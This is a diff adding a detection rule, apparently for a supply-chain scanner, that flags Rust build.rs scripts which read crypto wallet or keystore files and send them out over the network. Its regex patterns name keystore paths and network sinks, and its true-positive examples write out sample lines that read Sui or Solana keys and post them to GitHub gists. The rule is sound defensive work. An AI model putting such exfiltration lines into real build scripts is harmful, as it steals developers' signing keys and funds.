@@ -648,3 +648,40 @@ examples:
     - "subprocess.run(['node', 'scripts/build.js'])  # local build, no remote fetch"
     - "js = requests.get('https://cdn.example/foo.js').text; subprocess.run(['node', 'scripts/build.js'])  # fetched asset, but node runs a local file, not -e the payload"
     - "# Optional: pipe results.js through node -e after you download it yourself"
+---
+id: RS_BUILD_WALLET_EXFIL_001
+name: "Rust build.rs wallet/keystore exfiltration"
+description: "Detects a Cargo build script (build.rs) that reads crypto wallet or keystore material (Sui / Move / Solana / Aptos keystores, mnemonics) and sends it over the network. This is the TrapDoor-style crates.io payload: build-time theft of signing keys. Chain-based: requires BOTH a keystore reference AND a network exfil sink in the build script, so a build.rs that merely compiles native code or a normal app that reads a wallet without any network does not trip it."
+severity: CRITICAL
+category: supply-chain
+targets: ["build.rs"]
+match_mode: all
+remediation: "Build scripts must never read wallet or keystore material or open network connections to send it. Remove the keystore read and the network sink from build.rs. Audit the host and rotate any wallet keys, mnemonics, or signing keys reachable from the build environment."
+patterns:
+  # (1) A keystore READ: the wallet/keystore path must appear inside an
+  # actual Rust read/open call (read_to_string, fs::read, read_to_end,
+  # File::open), not merely constructed (format!/PathBuf/Path/join) or
+  # stored as a doc/rerun string. [^;]{0,80} keeps the read API and the
+  # path within the same statement. A path-only comment lacks a read API
+  # and does not match; a fully commented-out read call is a known
+  # residual (the matcher does not parse Rust comments -- see the
+  # follow-up issue). We do NOT exclude // lines, because the prior
+  # 3-line-lookback comment exclusion suppressed real reads that merely
+  # had a comment nearby.
+  - type: regex
+    value: "(?i)(read_to_string|read_to_end|fs::read\\b|File::open)[^;]{0,80}(sui\\.keystore|\\.sui/|\\.solana/|solana/id\\.json|\\.aptos/|wallet\\.dat|\\.electrum/|keystore\\.json)"
+  # (2) A network exfil sink.
+  - type: regex
+    value: "(?i)(reqwest::|ureq::|hyper::Client|surf::|isahc::|api\\.github\\.com/gists|gist\\.github\\.com|TcpStream::connect)"
+examples:
+  true_positive:
+    - "let key = std::fs::read_to_string(format!(\"{}/.sui/sui_config/sui.keystore\", home))?; let enc = xor(key.as_bytes(), b\"cargo-build-helper-2026\"); ureq::post(\"https://api.github.com/gists\").send_string(&base64::encode(enc));"
+    - "let id = std::fs::read(\"/home/u/.config/solana/id.json\")?; reqwest::blocking::Client::new().post(\"https://gist.github.com/api\").body(base64::encode(id)).send().ok();"
+  false_positive:
+    - "cc::Build::new().file(\"src/native/foo.c\").compile(\"foo\");  // normal native build, no keystore, no network"
+    - "let cfg = std::fs::read_to_string(\"$HOME/.solana/id.json\")?; println!(\"cargo:rerun-if-changed={}\", cfg);  // reads a path but never sends it"
+    - "ureq::get(\"https://crates.io/api/v1/crates/foo\").call()?;  // network, but no keystore access"
+    - "// build.rs note: the app later reads ~/.sui/sui_config/sui.keystore at runtime"
+    - "// docs: app reads ~/.sui/sui_config/sui.keystore at runtime; let meta = ureq::get(\"https://crates.io/api/v1/crates/foo\").call()?;"
+    - "let p = PathBuf::from(home).join(\".sui\").join(\"sui.keystore\"); let meta = ureq::get(\"https://crates.io/api/v1/crates/foo\").call()?;  // builds a path but never reads it"
+    - "// std::fs::read_to_string(\"~/.sui/sui_config/sui.keystore\")  // commented-out example, not real code"
